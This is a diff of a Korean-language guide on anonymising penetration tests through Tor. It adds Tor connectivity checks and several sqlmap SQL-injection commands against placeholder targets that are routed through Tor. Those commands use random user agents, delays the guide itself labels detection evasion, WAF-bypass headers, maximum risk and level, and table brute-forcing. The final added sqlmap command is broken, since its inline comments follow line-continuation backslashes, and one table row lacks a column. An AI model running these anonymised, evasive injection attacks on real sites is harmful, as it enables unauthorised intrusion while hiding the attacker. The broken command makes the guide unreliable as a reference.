@@ -86,6 +86,10 @@ sudo apt install -y tor torsocks
 sudo systemctl start tor
 sudo systemctl enable tor
 
+# 수동 실행 (도커 등 systemctl 사용이 어려울 때)
+tor
+
+
 # 상태 확인
 sudo systemctl status tor
 ```
@@ -119,6 +123,14 @@ curl -x socks5h://127.0.0.1:9050 https://example.com
 
 # IP 확인
 torsocks curl https://ifconfig.me
+
+### Tor 연결 확인
+
+# 두 IP 주소가 다르면 Tor가 정상 작동 중
+echo "일반 IP 주소: $(curl -s https://api.ipify.org)"
+echo "Tor IP 주소: $(torsocks curl -s https://api.ipify.org)"
+# 방법 3: Tor 프로젝트의 IP 확인 서비스 사용
+torsocks curl -s https://check.torproject.org/api/ip
 ```
 
 #### 🔍 침투 테스트 도구와의 연동
@@ -350,20 +362,25 @@ sqlmap -u "http://target.com/login.php" \
   --data="username=admin&password=123" \
   --tor --tor-type=SOCKS5 --check-tor \
   --random-agent --delay=2 --timeout=30 \
-  --threads=1 --technique=BEUSTQ
+  --threads=1 --technique=BEUSTQ \
+  -m text.txt
+
 ```
 
 ##### 핵심 옵션 설명
 
-| 옵션                | 설명                     | 보안 효과            |
-| ------------------- | ------------------------ | -------------------- |
-| `--tor`             | Tor 네트워크 사용 활성화 | 기본 익명화          |
-| `--tor-type=SOCKS5` | SOCKS5 프로토콜 지정     | 프록시 프로토콜 명시 |
-| `--check-tor`       | Tor 연결 상태 검증       | 익명화 확인          |
-| `--random-agent`    | User-Agent 무작위 변경   | 핑거프린팅 방지      |
-| `--delay=2`         | 요청 간 2초 지연         | 탐지 회피            |
-| `--timeout=30`      | 타임아웃 30초 설정       | 네트워크 안정성      |
-| `--threads=1`       | 단일 스레드 사용         | 네트워크 부하 최소화 |
+| 옵션                | 설명                                            | 보안 효과            |
+| ------------------- | ----------------------------------------------- | -------------------- |
+| `--tor`             | Tor 네트워크 사용 활성화                        | 기본 익명화          |
+| `--tor-type=SOCKS5` | SOCKS5 프로토콜 지정                            | 프록시 프로토콜 명시 |
+| `--check-tor`       | Tor 연결 상태 검증                              | 익명화 확인          |
+| `--random-agent`    | User-Agent 무작위 변경                          | 핑거프린팅 방지      |
+| `--delay=2`         | 요청 간 2초 지연                                | 탐지 회피            |
+| `--timeout=30`      | 타임아웃 30초 설정                              | 네트워크 안정성      |
+| `--threads=1`       | 단일 스레드 사용                                | 네트워크 부하 최소화 |
+| `-m FILE`           | FILE에 적힌 여러 URL을 한꺼번에 자동으로 테스트 |
+| `-u URL`            | 요청 보낼 대상 URL (주로 GET 방식)              |
+| `--data`            | POST 요청 시 보낼 데이터 (본문)                 |
 
 ##### WAF 우회 기법 조합
 
@@ -376,6 +393,39 @@ sqlmap -u "http://target.com/search.php?q=test" \
   --headers="X-Forwarded-For:127.0.0.1" \
   --headers="X-Real-IP:127.0.0.1" \
   --technique=B --risk=3 --level=5
+
+
+# 일반 sqlmap
+sqlmap -u "http://example.com/page.php?id=1" --common-tables -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt
+
+# tor + sqlmap
+sqlmap -u "http://example.com/page.php?id=1" \
+  --tor --tor-type=SOCKS5 --check-tor \
+  --common-tables \
+  -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt \
+  --random-agent \
+  --delay=3 \
+  --timeout=15 \
+  --retries=3 \
+  --batch
+
+# 랜덤 지연
+sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --delay=3 --time-sec=5 --randomize=length --safe-url="http://example.com/" --safe-freq=10
+
+
+# DBMS
+sqlmap -u "http://example.com/page.php?id=1" \
+  --tor --tor-type=SOCKS5 \
+  --dbms=mysql \  # 특정 DBMS 대상으로 최적화
+  --common-tables \
+  -t /path/to/SecLists/Discovery/Web-Content/MySQL.txt \
+  --level=5 \    # 테스트 레벨 증가 (더 철저한 검사)
+  --risk=3 \     # 위험도 증가 (더 공격적인 테스트)
+  --threads=2 \  # Tor 네트워크에서는 스레드 수를 낮게 유지
+  --hex \        # 특수 문자를 HEX 인코딩
+  --output-dir=/tmp/sqlmap_results  # 결과 저장 디렉토리 지정
+
+
 ```
 
 #### 🔍 **nmap** - 네트워크 스캔
